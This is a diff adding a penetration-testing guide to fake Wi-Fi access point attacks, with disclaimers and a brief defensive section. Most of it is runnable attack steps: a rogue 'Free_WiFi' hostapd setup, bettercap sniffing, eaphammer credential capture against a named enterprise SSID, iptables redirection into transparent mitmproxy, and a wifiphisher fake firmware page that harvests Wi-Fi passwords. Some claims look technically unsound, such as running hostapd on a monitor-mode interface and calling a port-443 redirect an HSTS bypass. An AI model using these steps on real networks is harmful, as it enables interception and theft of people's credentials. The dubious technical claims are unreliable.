@@ -1,0 +1,140 @@
+1. Introduction​
+A Fake Access Point (FAP) is a rogue Wi-Fi network created to deceive users into connecting to it. This attack method is often combined with Man-in-the-Middle (MITM) and credential harvesting techniques to steal sensitive information.
+
+This guide covers offensive security techniques used in penetration testing, with a detailed proof of concept (PoC) to demonstrate the attack workflow. We also discuss advanced attack techniques and defensive countermeasures.
+
+⚠️ Disclaimer: This guide is for educational and authorized security testing only. Unauthorized access to networks is illegal.
+
+2. Understanding Fake Access Point Attacks​
+2.1. Evil Twin Attack​
+The Evil Twin technique creates a malicious clone of a legitimate Wi-Fi network to lure victims. Users unknowingly connect to the attacker’s network instead of the real one.
+
+Attackers commonly use:
+
+Deauthentication attacks to disconnect users from the real AP.
+DNS spoofing to redirect users to phishing pages.
+2.2. Captive Portal Attacks​
+A captive portal attack forces users to enter credentials by simulating a login page. Attackers use this to harvest:
+
+Social media, email, or enterprise login credentials.
+Multi-factor authentication (MFA) codes via phishing.
+Tools like Wifiphisher automate this process.
+
+2.3. Man-in-the-Middle (MITM) Attacks​
+Once a victim connects to the rogue AP, attackers can:
+
+Intercept HTTP/HTTPS traffic with tools like <span>mitmproxy</span>.
+Inject malicious scripts into unencrypted traffic.
+Perform SSL stripping to downgrade HTTPS connections.
+3. Setting Up a Fake Access Point (PoC)​
+3.1. Requirements​
+A Linux-based system (Kali, Parrot, Ubuntu).
+A Wi-Fi adapter supporting monitor mode & packet injection.
+The following tools:
+Aircrack-ng
+Hostapd
+Dnsmasq
+Bettercap
+3.2. Creating the Fake AP​
+Step 1: Enable Monitor Mode​
+Bash:
+airmon-ng check kill
+airmon-ng start wlan0
+Step 2: Configure Hostapd​
+Bash:
+nano hostapd.conf
+
+Bash:
+interface=wlan0mon
+ssid=Free_WiFi
+channel=6
+auth_algs=1
+wpa=2
+wpa_passphrase=SecurePass
+
+Start the Fake AP:
+Bash:
+hostapd hostapd.conf
+3.3. Capturing Traffic with Bettercap​
+Once users connect to our rogue AP, we can capture and manipulate traffic.
+
+Start Bettercap:
+Bash:
+bettercap -iface wlan0mon
+Inside Bettercap, enable network sniffing:
+Bash:
+net.probe on
+net.sniff on
+4. Advanced Techniques​
+4.1. WPA2-Enterprise Attacks with EAPHammer​
+Bash:
+eaphammer -i wlan0mon --target "Company-WiFi" --auth wpa2-ent --creds
+4.2. Bypassing HSTS with SSL Stripping​
+Bash:
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
+mitmproxy -p 8080 --mode transparent
+4.3. Automating Attacks with Wifiphisher​
+Bash:
+wifiphisher -aI wlan0mon -p firmware-upgrade
+5. Extended PoC: Live Attack Demonstrations​
+This section provides a step-by-step proof of concept (PoC) for executing advanced Fake Access Point (FAP) attacks using:
+
+EAPHammer (to target WPA2-Enterprise networks)
+MITMProxy (for HTTPS traffic interception)
+Wifiphisher (automated phishing-based attack)
+⚠️ Legal Disclaimer: These demonstrations are for authorized penetration testing only. Unauthorized access to networks is illegal.
+
+5.1. WPA2-Enterprise Credential Theft with EAPHammer​
+Step 1: Setting Up EAPHammer​
+Bash:
+git clone https://github.com/s0lst1c3/eaphammer.git
+cd eaphammer
+./install.sh
+Step 2: Launching the Attack​
+Bash:
+eaphammer -i wlan0mon --target "Company-WiFi" --auth wpa2-ent --creds
+This spoofs the legitimate SSID and captures credentials when a victim attempts authentication.
+
+5.2. SSL Stripping with MITMProxy​
+Step 1: Install MITMProxy​
+Bash:
+sudo apt install mitmproxy
+Redirect HTTP/HTTPS traffic:
+Bash:
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
+Step 2: Launch MITMProxy​
+Bash:
+mitmproxy -p 8080 --mode transparent
+This captures and downgrades HTTPS connections when possible.
+
+5.3. Phishing with Wifiphisher​
+Step 1: Install Wifiphisher​
+Code:
+git clone https://github.com/wifiphisher/wifiphisher.git
+cd wifiphisher
+sudo python3 setup.py install
+Step 2: Launching the Attack​
+Bash:
+wifiphisher -aI wlan0mon -p firmware-upgrade
+This disconnects victims and presents a fake firmware update page to capture Wi-Fi credentials.
+
+6. Defensive Measures​
+6.1. Detecting Rogue APs​
+Use Kismet to detect Fake APs:
+
+Bash:
+kismet -c wlan0
+It flags suspicious networks.
+
+6.2. Preventing Auto-Connect Attacks​
+Disable auto-connect to open Wi-Fi networks.
+Use a VPN to encrypt traffic.
+Verify HTTPS & SSL certificates before entering credentials.
+6.3. Enforcing Secure Wi-Fi Standards​
+Organizations should:
+
+Deploy WPA3 + 802.1X for authentication.
+Use Wireless Intrusion Detection Systems (WIDS).
+Regularly audit wireless infrastructure.
